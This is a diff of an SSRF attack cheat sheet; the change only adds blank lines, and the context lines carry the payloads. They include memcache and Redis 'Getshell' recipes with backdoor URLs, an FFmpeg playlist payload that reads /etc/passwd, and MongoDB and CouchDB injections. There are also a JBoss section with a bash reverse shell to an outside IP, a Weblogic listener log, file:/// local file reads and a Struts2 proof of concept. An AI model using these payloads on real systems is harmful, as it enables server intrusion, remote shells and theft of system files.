@@ -2,6 +2,7 @@
 Cheat sheet
 
 ###########################################
+
 SSRF PHP function
 
 file_get_contents()
@@ -9,6 +10,7 @@ fsockopen()
 curl_exec()
 
 ###########################################
+
 URL schema support
 
 SFTP:
@@ -58,10 +60,12 @@ ldap:
 http://example.com/redirect.php?url=ldap://localhost:11211/%0astats%0aquit
 
 ###########################################
+
 PHP-FPM
 PHP-FPM universal SSRF bypass safe_mode/disabled_functions/o exploit
 
 ###########################################
+
 SSRF memcache Getshell
 
 Generate serialize:
@@ -104,6 +108,7 @@ backdoor url
 http://bbs.biligame.com/data/cache/hello.php
 
 ###########################################
+
 SSRF Redis Getshell
 
 Generate serialize:
@@ -132,6 +137,7 @@ Backdoor website
 http://192.168.80.116/forum.php?mod=ajax&inajax=yes&action=getthreadtypes
 
 ###########################################
+
 FFmpeg
 
 cat test.jpg
@@ -151,6 +157,7 @@ concat:http://localhost/header.m3u8|subfile,,start,0,end,64,,:///etc/passwdconca
 #EXT-X-ENDLIST
 
 ###########################################
+
 PostgreSQL
 
 Exploit:
@@ -159,6 +166,7 @@ Exploit:
 version();');
 
 ###########################################
+
 MongoDB
 
 Exploit:
@@ -168,6 +176,7 @@ Exploit:
 > db.copyDatabase(“\nstats\nquit”,’test’,’localhost:11211’)
 
 ###########################################
+
 CouchDB
 
 exploit:
@@ -196,6 +205,7 @@ Accept: application/json
 }
 
 ###########################################
+
 Jboss
 
 Jbosss POC:
@@ -216,6 +226,7 @@ Reverse shell:
 bash -i >& /dev/tcp/123.45.67.89/9999 0>&1
 
 ###########################################
+
 Weblogic
 
 gopher.php:
@@ -237,12 +248,14 @@ vps:
 Connection from xx.xx.xx.xx port 2333 [tcp/snapp] accepted
 
 ###########################################
+
 Local File Read
 
 http://www.xxx.com/redirect.php?url=file:///etc/passwd
 http://www.xxx.com/redirect.php?url=file:///C:/Windows/win.ini
 
 ###########################################
+
 Bool SSRF
 
 Struts2-016 POC:
@@ -252,6 +265,7 @@ Struts2-016 POC:
 //Modificar el SERVIDOR para que el vps devuelva los resultados en la vista access.log
 
 ###########################################
+
 SSRF Proxy
 
 SSRF_Proxy:
